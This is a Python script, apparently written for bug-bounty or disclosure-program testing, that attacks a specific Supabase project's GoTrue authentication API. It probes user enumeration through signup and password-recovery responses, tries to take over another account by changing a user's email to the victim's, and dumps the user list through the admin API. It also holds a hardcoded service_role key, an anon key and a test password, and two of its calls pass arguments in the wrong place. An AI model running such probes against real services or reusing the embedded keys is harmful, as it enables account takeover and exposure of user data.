# -*- coding: utf-8 -*-
"""GoTrue 身份面: 用户枚举 + 邮箱修改越权 + token 面 (不依赖 mgmt)"""
import http.client, ssl, json, time, os, sys, re
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _supabase_creds import VDP_HEADERS, UA, PROJECT_REF

ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZuZm9iYnl3ZW1xZ2Nnam9ra3hkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg1MDM2MjQsImV4cCI6MjEwNDA3OTYyNH0.DNQluKwykRJKoIRtWRd5AJCZTysTZEEGc3ooMZ6B_7Q"
SR_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZuZm9iYnl3ZW1xZ2Nnam9ra3hkIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4ODUwMzYyNCwiZXhwIjoyMTA0MDc5NjI0fQ.Uq8457YU68HS3Xw9LFRyQIGQfxSNy9jXcVKdkKuucvE"
HOST = '%s.supabase.co' % PROJECT_REF
toks = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb_tokens.json'), 'r'))
A_EMAIL, A_PASS = 'sbx_auvjijfz@qq.com', 'Sbxtest123!'
ctx = ssl.create_default_context()
out = []
def call(method, path, body=None, tag='', bearer=None, apikey=ANON_KEY, maxb=6000, retries=2):
    body_j = json.dumps(body) if body is not None else None
    for i in range(retries):
        c = http.client.HTTPSConnection(HOST, timeout=25, context=ctx)
        h = {"User-Agent": UA, "Accept": "application/json", "apikey": apikey,
             "Authorization": "Bearer " + (bearer or apikey)}
        if body_j:
            h["Content-Type"] = "application/json"
        h.update(VDP_HEADERS)
        t0 = time.time()
        try:
            c.request(method, path, headers=h, body=body_j)
            r = c.getresponse()
            b = r.read(maxb).decode('utf-8', errors='replace')
            out.append('### [%s] %s %s (%.1fs)\n%s | %s' % (tag, method, path, time.time() - t0, r.status, b[:1200]))
            c.close()
            return r.status, b
        except Exception as e:
            out.append('### [%s] %s %s try%d ERR %s' % (tag, method, path, i + 1, e))
            time.sleep(1.5)
    return 0, ''

# 0. A 登录
st, b = call('POST', '/auth/v1/token?grant_type=password', {"email": A_EMAIL, "password": A_PASS}, 'login-A')
A_TOKEN = re.search(r'"access_token":"([^"]+)"', b).group(1)
# 1. signup 已存在邮箱 (用户枚举?)
call('POST', '/auth/v1/signup', {"email": A_EMAIL, "password": "Xyz123456!"}, 'signup-exists')
# 2. signup B 的邮箱 (已存在)
call('POST', '/auth/v1/signup', {"email": toks['B_EMAIL'], "password": "Xyz123456!"}, 'signup-B-exists')
# 3. A 尝试把邮箱改成 B 的邮箱 (PUT /user)
call('PUT', '/auth/v1/user', {"email": toks['B_EMAIL']}, 'A-chg-email-B', bearer=A_TOKEN)
# 4. A 改自己 user_metadata (正常)
call('PUT', '/auth/v1/user', {"data": {"sbx_probe": "1"}}, 'A-upd-meta', bearer=A_TOKEN)
# 5. recover 存在邮箱 (响应差异?)
call('POST', '/auth/v1/recover', {"email": A_EMAIL}, 'recover-exists')
# 6. recover 不存在邮箱
call('POST', '/auth/v1/recover', {"email": "sbx_nobody_zz9@qq.com"}, 'recover-nobody')
# 7. A 用 B 的 refresh_token? (B token 在 json 里没有 refresh - 跳过, 用 admin API 面)
# 8. admin list users (sr)
call('GET', '/auth/v1/admin/users?per_page=50', 'admin-users', apikey=SR_KEY)
# 9. A userinfo (自己的)
call('GET', '/auth/v1/user', 'A-userinfo', bearer=A_TOKEN)

open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb71_gotrue.txt'), 'w', encoding='utf-8').write('\n'.join(out))
print('\n'.join(out))
